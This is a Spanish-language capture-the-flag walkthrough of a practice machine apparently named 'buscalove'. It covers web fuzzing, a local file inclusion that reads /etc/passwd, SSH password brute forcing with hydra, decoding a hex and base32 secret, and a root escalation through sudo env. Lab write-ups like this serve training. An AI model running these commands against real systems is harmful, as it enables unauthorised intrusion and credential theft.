PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos al puerto 80 y hay un Apache Default

-Hacemos Fuzzing web y encontramos la siguiente ruta
	/wordpress

-Sin embargo no es un wordpress, ya que Wappalizer y Wpscan no lo detectan como wordpress  

-Seguimos haciendo Fuzzing y encontramos la siguiente ruta:
	/index.php

-Esto no es nada realista , pero puede servir en algún momento

-Hacemos Fuzzing a posibles parámetros que pueda tener 'index.php' y abusar de ellos en un LFi (Local File Inclusion)
	-Con ffuf: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://172.19.0.2/wordpress/index.php?FUZZ' -c  -fl 41
	-Con gobuster: gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://buscalove/wordpress/index.php?FUZZ'  --exclude-length 1048,302

-Parámetro encontrado:
	love                    [Status: 500, Size: 772, Words: 128, Lines: 25, Duration: 1ms]

-Hacemos un curl para ver el contenido del /etc/passwd:
	-curl -s -X GET "http://172.19.0.2/wordpress/index.php?love=/etc/passwd"
	-Vemos los siguientes usuarios interesantes:
		pedro:x:1001:1001::/home/pedro:/bin/bash
		rosa:x:1002:1002::/home/rosa:/bin/bash

-Hacemos fuerza bruta por ssh a Rosa:
	-hydra ssh://172.19.0.2 -l rosa -P /usr/share/wordlists/rockyou.txt -V
		-User: rosa    -Password: lovebug

-Nos conectamos por ssh con el usuario rosa:
	ssh rosa@172.19.0.2
	-Password: lovebug
	rosa@97af3f669cce:~$


## Escalada de Privilegios

-rosa@97af3f669cce:~$: sudo -l
	(ALL) NOPASSWD: /usr/bin/ls  /usr/bin/cat

-Listamos el directorio de root:
	-sudo /usr/bin/ls:
		-secret.txt

-Vemos el contenido de secret.txt:
	-sudo /usr/bin/cat secret.txt
		4E 5A 58 57 43 59 33 46 4F 4A 32 47 43 34 54 42 4F 4E 58 58 47 32 49 4B

-Parece ser una cadena en Hexadecimal, usamos el siguiente comando para convertir la cadena Hexadecimal en texto ASCII:
	-echo "4E5A5857435933464F4A3247433454424F4E58584732494B" | xxd -r -p

-La cadena obtenida, tiene características de un texto en base32, vamos a decodificarlo:
	-echo "NZXWCY3FOJ2GC4TBONXXG2IK" | base32 -d
		-noacertarasosi

-Probamos a autenticarnos con root con la cadena obtenida pero no funciona

-Probamos con el usuario 'pedro':
	-su pedro
	-password: noacertarasosi
	pedro@97af3f669cce:
	-Ha Funcionado!!

-Vemos que comandos puede ejecutar el usuario pedro como root:
	-pedro@97af3f669cce:$ sudo -l
		(ALL) NOPASSWD: /usr/bin/env

-Abusamos de /usr/bin/env para escalar a root:
	-sudo env /bin/sh
	root@97af3f669cce:/# whoami
	root


